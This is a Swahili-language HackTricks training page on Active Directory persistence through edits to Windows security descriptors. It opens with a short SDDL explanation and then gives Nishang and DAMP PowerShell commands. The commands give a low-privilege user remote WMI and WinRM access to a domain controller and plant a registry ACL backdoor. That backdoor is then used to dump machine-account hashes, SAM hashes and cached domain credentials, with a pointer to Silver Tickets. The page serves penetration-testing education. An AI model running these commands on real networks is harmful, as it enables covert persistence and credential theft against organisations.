# Vibainishi vya Usalama

{{#include ../../banners/hacktricks-training.md}}

## Vibainishi vya Usalama

[Kutoka kwenye docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) hufafanua muundo unaotumiwa kueleza security descriptor. SDDL hutumia ACE strings kwa DACL na SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**security descriptors** hutumiwa **kuhifadhi** **ruhusa** ambazo **object** inazo **juu ya** **object** nyingine. Ikiwa unaweza kufanya **mabadiliko** **madogo** katika **security descriptor** ya object, unaweza kupata privileges za kuvutia sana juu ya object hiyo bila kuhitaji kuwa mwanachama wa privileged group.

Kwa hiyo, mbinu hii ya persistence inategemea uwezo wa kupata kila privilege inayohitajika dhidi ya objects fulani, ili kuweza kutekeleza kazi ambayo kwa kawaida huhitaji admin privileges, lakini bila kuhitaji kuwa admin.

### Ufikiaji wa WMI

Unaweza kumpa user ufikiaji wa **kutekeleza WMI kwa mbali** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Access to WinRM

Toa access ya **winrm PS console kwa mtumiaji** [**kwa kutumia hii**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Ufikiaji wa mbali wa hashes

Pata ufikiaji wa **registry** na **dump hashes** kwa kuunda **Reg backdoor ukitumia** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** ili uweze wakati wowote kupata **hash ya computer**, **SAM** na credential yoyote ya **AD** iliyohifadhiwa kwenye computer. Kwa hiyo, ni muhimu sana kumpa **regular user** ruhusa hii dhidi ya **Domain Controller computer**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Angalia [**Silver Tickets**](silver-ticket.md) ili kujifunza jinsi unavyoweza kutumia hash ya computer account ya Domain Controller.

## Marejeleo

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
